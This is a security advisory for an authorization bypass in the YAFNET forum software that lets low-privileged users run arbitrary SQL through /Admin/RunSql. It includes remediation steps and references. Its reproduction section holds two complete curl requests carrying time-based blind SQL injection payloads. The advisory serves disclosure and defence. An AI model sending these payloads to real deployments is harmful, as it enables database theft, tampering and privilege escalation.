@@ -1,0 +1,85 @@
+# [H] YAFNET: Pre-Handler Authorization Bypass on Admin Pages Enables Blind SQL Execution via `/Admin/RunSql`
+
+## Summary
+Severity: High
+Advisory: GHSA-xhw7-j96h-c3g5
+CVE: CVE-2026-43937
+CWE: CWE-841, CWE-89
+Ecosystem: NuGet
+CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
+Published: 2026-05-05
+Source: https://github.com/advisories/GHSA-xhw7-j96h-c3g5
+Type: github-advisory
+
+## Affected
+- NuGet: `YAFNET.Core` — affected >=0 <4.0.5
+
+## Details
+**Issue Details:**
+YAFNET's only admin authorization gate is `PageSecurityCheckAttribute`, implemented as a `ResultFilterAttribute` that runs *after* the page handler completes rather than before it. No other gate exists. Any admin `OnPost…` handler therefore executes its side effects before the filter rewrites the response to a `302` to `/Info/4`. The most impactful abuse is `/Admin/RunSql`, whose `OnPostRunQuery` binds `Editor` from the POST body and passes it straight to `IDbAccess.RunSql` with no caller check, yielding arbitrary SQL execution for any low-privileged user.
+
+A deterministic boolean-conditional time oracle was confirmed end-to-end by extracting the first character of `@@VERSION`: `IF (ASCII(SUBSTRING(@@VERSION, 1, 1)) = 77) WAITFOR DELAY '0:0:5'` produced a ~5-second delay (confirming the byte is `M`), while `IF (ASCII(SUBSTRING(@@VERSION, 1, 1)) = 76) WAITFOR DELAY '0:0:5'` returned immediately.
+
+
+**Impact:**
+An attacker holding the lowest-privileged authenticated role, effectively an anonymous attacker on any deployment that permits self-registration, gains arbitrary blind SQL execution against the application's database, with full `INSERT`/`UPDATE`/`DELETE` access to every table including the Identity store (`AspNetUsers`, `yaf_User`, `yaf_UserRole`). This yields full loss of Confidentiality (any column extractable via the time oracle), full loss of Integrity (blind writes to identity, posts, and forum configuration, including self-promotion to HostAdmin), and full loss of Availability (`DELETE`/`DROP`/`WAITFOR`-driven DoS). The impact escalates out of the application's trust domain: if the underlying SQL Server instance has `xp_cmdshell` or CLR integration enabled (common in development and test builds), the same primitive yields OS-level command execution on the database host. Because the bypass is class-wide, every other admin handler is also callable, multiplying the blast radius across user management, XML imports, and file-writing configuration pages.
+
+**Likelihood:**
+Exploitation requires only a registered forum account (self-registration available on most deployments) and a single HTTP POST request. The attack is fully automatable in one request per probe and produces a deterministic time-based oracle with no error handling required, making the overall likelihood very high.
+
+**Steps to Reproduce:**
+- Register or log in to the forum as any low-privileged user.
+- Acquire the standard `__RequestVerificationToken` token from any rendered page and the cookies. 
+- Use the following CURL command:
+Payload: ```IF (ASCII(SUBSTRING(@@VERSION, 1, 1)) = 77) WAITFOR DELAY '0:0:5'``` (77 is the character **M**)
+URL Encoded Payload: ```%49%46%20%28%41%53%43%49%49%28%53%55%42%53%54%52%49%4e%47%28%40%40%56%45%52%53%49%4f%4e%2c%20%31%2c%20%31%29%29%20%3d%20%37%37%29%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%35%27```
+
+```
+curl.exe --path-as-is -i -s -k -X POST `
+  -H 'Host: yetanotherforum.internal:8080' `
+  -H 'User-Agent: curl/8.18.0' `
+  -H 'Accept: */*' `
+  -H 'Content-Type: application/x-www-form-urlencoded' `
+  -H 'Content-Length: 428' `
+  -H 'Connection: keep-alive' `
+  -b '<Replace with Cookies>' `
+  --data-binary 'Editor=%49%46%20%28%41%53%43%49%49%28%53%55%42%53%54%52%49%4e%47%28%40%40%56%45%52%53%49%4f%4e%2c%20%31%2c%20%31%29%29%20%3d%20%37%37%29%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%35%27&__RequestVerificationToken=<Replace with Token>' `
+  -w '\n----\nDNS:        %{time_namelookup}s\nConnect:    %{time_connect}s\nTTFB:       %{time_starttransfer}s\nTotal time: %{time_total}s\nHTTP code:  %{http_code}\n' `
+  'http://yetanotherforum.internal:8080/Admin/RunSql?handler=RunQuery'
+```
+<img width="1619" height="921" alt="image" src="https://github.com/user-attachments/assets/1c5d4d96-a69a-47eb-9558-e5fe1e6cc9e4" />
+
+Payload: ```IF (ASCII(SUBSTRING(@@VERSION, 1, 1)) = 76) WAITFOR DELAY '0:0:5'``` (76 is the character **L**)
+URL Encoded Payload: ```%49%46%20%28%41%53%43%49%49%28%53%55%42%53%54%52%49%4e%47%28%40%40%56%45%52%53%49%4f%4e%2c%20%31%2c%20%31%29%29%20%3d%20%37%36%29%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%35%27```
+
+```
+curl.exe --path-as-is -i -s -k -X POST `
+  -H 'Host: yetanotherforum.internal:8080' `
+  -H 'User-Agent: curl/8.18.0' `
+  -H 'Accept: */*' `
+  -H 'Content-Type: application/x-www-form-urlencoded' `
+  -H 'Content-Length: 428' `
+  -H 'Connection: keep-alive' `
+  -b '<Replace with Cookies>' `
+  --data-binary 'Editor=%49%46%20%28%41%53%43%49%49%28%53%55%42%53%54%52%49%4e%47%28%40%40%56%45%52%53%49%4f%4e%2c%20%31%2c%20%31%29%29%20%3d%20%37%36%29%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%35%27&__RequestVerificationToken=<Replace with Token>' `
+  -w '\n----\nDNS:        %{time_namelookup}s\nConnect:    %{time_connect}s\nTTFB:       %{time_starttransfer}s\nTotal time: %{time_total}s\nHTTP code:  %{http_code}\n' `
+  'http://yetanotherforum.internal:8080/Admin/RunSql?handler=RunQuery'
+```
+
+<img width="1616" height="928" alt="image" src="https://github.com/user-attachments/assets/e499da2e-d4d1-41cd-a5da-e709bf60f817" />
+
+Observe that when the condition is true the response time increases, if false, it remains unchanged which confirms the presence of SQL Injection.
+
+**Remediation:**
+- Convert `PageSecurityCheckAttribute` from a `ResultFilterAttribute` to an `IAsyncPageFilter` so the admin check runs in `OnPageHandlerExecutionAsync` and short-circuits with `AccessDenied()` before any handler side effects occur.
+- Layer an ASP.NET Core authorization policy as defense-in-depth: `AddAuthorization(... AddPolicy("YafAdmin", ...))` combined with `AuthorizeFolder("/Admin", "YafAdmin")` in the Razor Pages conventions.
+- Restrict `/Admin/RunSql` to `HostAdmin` only and wrap `IDbAccess.RunSql` in a statement-type allow-list that rejects non-read-only SQL, even for legitimate admins.
+- Audit and fix any other authorization logic implemented in `ResultFilterAttribute` / `OnResultExecuting(Async)`, they share the same lifecycle bug.
+- Add regression tests that invoke each admin `OnPost…` handler as a non-admin and assert no database or filesystem side effects occur.
+
+## References
+- https://github.com/YAFNET/YAFNET/security/advisories/GHSA-xhw7-j96h-c3g5
+- https://nvd.nist.gov/vuln/detail/CVE-2026-43937
+- https://github.com/YAFNET/YAFNET/commit/27f7e671f93698f7e014d5d0fb88320248b8aa20
+- https://github.com/YAFNET/YAFNET
+- https://github.com/YAFNET/YAFNET/releases/tag/v4.0.5
